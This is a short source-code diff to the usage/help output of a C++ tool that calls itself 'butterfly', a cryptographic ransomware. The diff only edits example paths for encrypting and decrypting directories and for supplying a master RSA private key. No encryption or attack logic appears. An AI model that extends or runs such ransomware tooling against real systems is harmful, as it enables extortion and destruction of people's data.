@@ -137,14 +137,14 @@ ArgumentParser::Arguments ArgumentParser::parseArgs()
 
 void ArgumentParser::showUsage() const
 {
-    std::cout << "Butterfly is a cryptographic ransomware\n\n" <<
+    std::cout << "butterfly is a cryptographic ransomware\n\n" <<
 
                + "Usage: \n\t"
-                        + std::string(PROJECT_NAME) + " --dir /home/testuser/butterfly/data/\n\t"
-                        + std::string(PROJECT_NAME) + " --dir /home/testuser/butterfly/data/ --protected\n\n\t"
-                        + std::string(PROJECT_NAME) + " --encrypt /home/testuser/butterfly/data/ \n\t"
-                        + std::string(PROJECT_NAME) + " --decrypt /home/testuser/butterfly/data/ \n\n\t"
-                        + std::string(PROJECT_NAME) + " --decrypt /home/testuser/butterfly/data/ --key /home/testuser/butterfly/masterkeys/SPrivateRSA.pem\n\n"
+                        + std::string(PROJECT_NAME) + " --dir /home/butterfly/data/\n\t"
+                        + std::string(PROJECT_NAME) + " --dir /home/butterfly/data/ --protected\n\n\t"
+                        + std::string(PROJECT_NAME) + " --encrypt /home/butterfly/data/ \n\t"
+                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ \n\n\t"
+                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ --key /home/butterfly/butterfly/masterkeys/SPrivateRSA.pem\n\n"
 
                + "Options:\n"
                         + "\t-d,   --dir         Directory Path to start the Hybrid Encryption Mechanism (Encryption+Decryption)\n"
